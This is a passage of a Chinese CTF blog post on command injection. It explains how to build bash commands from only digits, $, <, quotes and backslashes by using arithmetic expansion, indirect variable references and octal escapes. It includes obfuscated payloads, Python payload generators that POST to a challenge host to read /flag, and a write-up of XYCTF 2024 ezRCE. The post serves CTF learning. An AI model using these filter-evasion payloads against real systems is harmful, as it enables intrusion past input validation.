+<p>去看了一下<a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow的极限rce的level5</a>，茅塞顿开，<u>我的思维又局限了</u>，已经可以构造出来十进制的字符串了，还干嘛费心费力去转二进制然后回十进制，变通，<strong>强调脑子要变通</strong>，那么就如下构造一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">那现在需要的就是1、 5 、4 、6 、3</span><br><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>再传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功构造出：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603191723486.png" alt="image-20240603191723486"></p>
+<p>这个同样有字符串那个问题，原因在本篇文章第一次提出这个问题给的参考那里有说，个人理解大概就是对于一个shell变量只进行一次，所以最后构造出来的<code>$&#39;&#39;</code>不会再运行。</p>
+<p>解决方法同样使用两次bash，先试试，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后传入成功执行<code>ls</code>，那么如何利用这个构造<code>bash</code>呢，不能只是简单的<code>$</code>+<code>$(())</code>，这样就算传进去也只会导致两个<code>$$</code>执行查看进程的命令，那么该如何构造呢，文章提出了思路：</p>
+<p>我们已知<code>$&#123;!#&#125;</code>输出为bash，结合间接引用<code>$&#123;!var&#125; -间接引用</code>的说明，在这里我们并没有对<code>#</code>这个赋值，却可以输出<code>bash</code>，那么我们是否可以猜测只要是没有值的参数，在这里都可以拿到<code>bash</code>这个输出，测试一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603203638487.png" alt="image-20240603203638487"></p>
+<p>在这张图片中，**可以看到<code>$&#123;!?&#125;</code>也是输出的<code>bash</code>**，虽然不知道为什么<code>$&#123;!0&#125;</code>没有输出（可能是因为是数字），但是可以采用第三个方法输出。但三个方法就是文章提出的，个人感觉还是挺精妙的</p>
+<p>所以在这里仅能通过<strong>定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0</strong>，<strong>然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh/bash</code>字符</strong>。两条命令间通过<code>&amp;&amp;(应该也可以使用 ; )</code>进行连接。由于bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。所以这里是<code>__</code>作为变量名。</p>
+<p>最终<code>ls</code>的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>wc，又是这个问题，宝塔linux本地只能用<code>bash</code>，换到centos跑一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204738674.png" alt="image-20240603204738674"></p>
+<p>成功执行，其他的payload构造也是同理。</p>
+<p>官方wp给了脚本（偷个懒），如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>来看看博主的方法</strong>，<code>$(())</code>对应0，使用自增构造出了1，2这两个数字。</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165230257.png" alt="image-20240603165230257"></p>
+<p>payload如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>自增需要抓包后url编码传参</strong></p>
+<p>可以使用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用 $? 构造"></a>利用 $? 构造</h5><p>正如上面说的，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，需要的值为<code>0</code>、<code>1</code>，2可以由<code>&lt;&lt;</code>得到</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603161335061.png" alt="image-20240603161335061"></p>
+<p>，这里只要最后的命令的推出状态没有错误就可以得到0，但是1就不能得到了，可以使用自增运算，如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /flag:</span><br><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>自增运算时传参需要url编码一下。</strong></p>
+<p>利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>自增等后面再来研究</p>
+<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="XYCTF-2024-ezRCE"><a href="#XYCTF-2024-ezRCE" class="headerlink" title="XYCTF 2024 - ezRCE"></a>XYCTF 2024 - ezRCE</h6><p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>
+
+<p>就是考的八进制数据，没有禁<code>&#39;</code>，先尝试直接<code>ls</code>，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180726080.png" alt="image-20240603180726080"></p>
+<p>读取根目录（<code>ls /</code>），可以如下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls / ==&gt;$&#x27;\154\163\40\57&#x27;</span><br><span class="line">$0&lt;&lt;&lt;\$0\&lt;\&lt;\&lt;\$\&#x27;\\154\\163\\40\\57\&#x27;</span><br><span class="line">防止转义</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180945707.png" alt="image-20240603180945707"></p>
+<p>最后读flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>读到flag</p>
+<p>但是正如常用的<code>bash&lt;&lt;&lt;...</code>这道题还可以尝试构造<code>bash</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\142\141\163\150&#x27;&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>也可以成功读到flag。</p>
+<p>注意知识点的融汇贯通。</p>
+<p>其他的题可以看看</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow-周末大挑战官方wp</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Fupanc
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/" title="rce之利用shell变量">https://fupanc.github.io/2024/06/03/rce之利用shell变量/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/" rel="prev" title="沙箱逃逸做题总结">
+                  <i class="fa fa-angle-left"></i> 沙箱逃逸做题总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fupanc</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script type="text/javascript"
+  color="0,0,0" opacity='0.4' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+    
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/yourname" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
